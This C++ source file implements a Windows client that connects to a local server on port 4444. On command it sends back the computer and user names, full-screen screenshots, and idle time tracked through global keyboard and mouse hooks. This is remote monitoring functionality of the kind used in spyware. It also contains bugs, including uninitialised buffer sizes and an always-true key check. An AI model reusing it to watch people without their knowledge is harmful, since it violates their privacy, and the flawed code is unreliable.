#include "Client.h"
#include <windows.h>

#include "ScreenCapture.h"

DWORD Client::thread_id_ = 0;
std::atomic<unsigned int> Client::inactive_for_ = 0;

Client::Client(Client &&connection) noexcept {
  socket_ = connection.socket_;
  valid_ = connection.valid_;
  connection.socket_ = INVALID_SOCKET;
  connection.valid_ = false;
  

}

Client::Status Client::Connect(const char *address) {

  
  socket_ = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (socket_ == INVALID_SOCKET) {
    valid_ = false;
    return Status::kSOCKET_ERR;
  }

  sockaddr_in server_addr;
  server_addr.sin_family = AF_INET; 
  server_addr.sin_port = htons(4444); 
  server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

  const int result = connect(
    socket_,
    reinterpret_cast<sockaddr *>(&server_addr),
    sizeof(server_addr)
  );

  if (result == SOCKET_ERROR) {
    valid_ = false;
    return Status::kCONNECT_ERR;
  }
  
  activity_tracker_ = CreateThread(
    NULL,
    0,
    ActivityThread,
    (LPVOID)this,
    0,
    &thread_id_
  );
  
  tcp_thread_ = CreateThread(
    NULL,
    0,
    TcpThread,
    (LPVOID)this,
    0,
    nullptr
  );

  pump_thread_ = CreateThread(
      NULL,
      0,
      PumpThread,
      (LPVOID)this,
      0,
      nullptr
    );
  
  /*MSG msg;
  while (GetMessage(&msg, nullptr, 0, 0)) {
    
  };*/
  
  valid_ = true;
  return Status::kOK;
}

void Client::Wait() const {
  WaitForSingleObject(tcp_thread_, INFINITE);
}

Client::~Client() {
  if (valid_) {
    closesocket(socket_);
  }
}


bool Client::Send(const char *message, const int length) const {
  const int bytes_sent = send(socket_, message, length, 0);
  if (bytes_sent == SOCKET_ERROR) { return false; }
  return true;
}

Command Client::Receive() const {
  char data;
  recv(socket_, &data, 1, 0);
  switch (data) {
  case 1:
    return Command::kINFO;
  case 2:
    return Command::kSCREEN;
  case 3:
    return Command::kACTIVITY;
  }
  return Command::kERR;
}



DWORD Client::TcpThread(const LPVOID param) {
  const Client *client = static_cast<Client *>(param);
  while (true) {
    Command command = client->Receive();
    if (command == Command::kERR) {
      break;
    }
    switch (command) {
    case Command::kINFO: {
      DWORD domain_size;
      DWORD user_size;
      TCHAR buf[ MAX_PATH ];
      GetComputerNameEx(ComputerNameDnsFullyQualified, buf, &domain_size);
      GetUserName(buf + (domain_size) + 1, &user_size);
      buf[domain_size] = L'.';
      const DWORD size = (domain_size + user_size + 1) * sizeof(TCHAR);
      while (!client->Send(reinterpret_cast<const char *>(&size), 4)) {};
      while (!client->Send(reinterpret_cast<char *>(&buf), size)) {};
      break;
    }
    case Command::kSCREEN: {
      IStream *file = Screenshot();
      STATSTG stats;
      file->Stat(&stats, 0);
      auto size = stats.cbSize.QuadPart;
      while (!client->Send(reinterpret_cast<char *>(&size), 8)) {};
      constexpr int chunk_size = 1024;
      char *data = new char[chunk_size];
      for (ULONGLONG i = 0; i < size;) {
        ULONG read_bytes;
        file->Read(data, chunk_size, &read_bytes);
        while (!client->Send(data, read_bytes)) {};
        i += read_bytes;
      }
      break;
    }
    case Command::kACTIVITY: {
      const unsigned int size = inactive_for_.load();
      while (!client->Send(reinterpret_cast<const char *>(&size), 4)) {};
      break;
    }
    default:
      break;
    }}
  return 0;
}

LRESULT CALLBACK Client::KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
  if (nCode >= 0) {
    if (wParam == WM_KEYDOWN || WM_KEYUP) {
      inactive_for_ = 0;
    }
  }
  return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK Client::MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
  if (nCode >= 0) {
    if (wParam == WM_MOUSEMOVE) {
      inactive_for_ = 0;
    }
  }
  return CallNextHookEx(NULL, nCode, wParam, lParam);
}



DWORD Client::ActivityThread(const LPVOID param) {
  Client *client = static_cast<Client *>(param);
  
  MSG msg;
  while (true) {
    client->inactive_for_ += 1;  
    Sleep(1000);          
  }
  POINT old_mouse_position = {0, 0};
  return 0;            
}

DWORD Client::PumpThread(const LPVOID param) {
  Client *client = static_cast<Client *>(param);
  
  client->mouse_hook_ = SetWindowsHookEx(WH_MOUSE_LL, MouseHookProc, NULL, 0);
  client->keyboard_hook_ = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);

  MSG msg;
  while (GetMessage(&msg, nullptr, 0, 0)) {
    
  }
  return 0;            
}
